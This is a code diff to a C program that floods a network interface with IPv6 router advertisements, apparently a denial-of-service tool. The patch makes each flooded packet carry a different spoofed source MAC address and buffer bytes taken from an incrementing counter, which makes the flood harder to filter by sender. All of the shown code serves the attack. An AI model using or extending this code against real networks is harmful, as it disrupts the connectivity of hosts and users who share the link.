@@ -142,6 +142,8 @@ int main(int argc, char *argv[]) {
     fprintf(stderr, "Error: invalid interface %s\n", interface);
     exit(-1);
   }
+  mac[0] = 0;
+  mac[1] = 0x0c;
   mtu = 1500;
   size = 64;
   k = rand();
@@ -173,6 +175,8 @@ int main(int argc, char *argv[]) {
   buf[15] = mtu % 256;
   buf[16] = 1; // mac
   buf[17] = 1;
+  buf[18] = 0;
+  buf[19] = 0x0c;
   // 18-23 = mac address
   buf[19] = 12;
   j = 24;
@@ -227,8 +231,9 @@ int main(int argc, char *argv[]) {
 //printf("j is %d, bsize %d\n", j, bsize);
   printf("Starting to flood network with router advertisements on %s (Press Control-C to end, a dot is printed for every 1000 packets):\n", interface);
   while (until != 1) {
-    memcpy(&buf[20], (char*)&k + _TAKE4, 4);
     memcpy(ip6 + 11, (char*)&k + _TAKE4, 4);
+    memcpy(&buf[20], (char*)&k + _TAKE4, 4);
+    memcpy(mac, (char*)&k + _TAKE4, 4);
     k++;
     for (i = 0; i < cnt; i++) {
       if (route_only == 0)
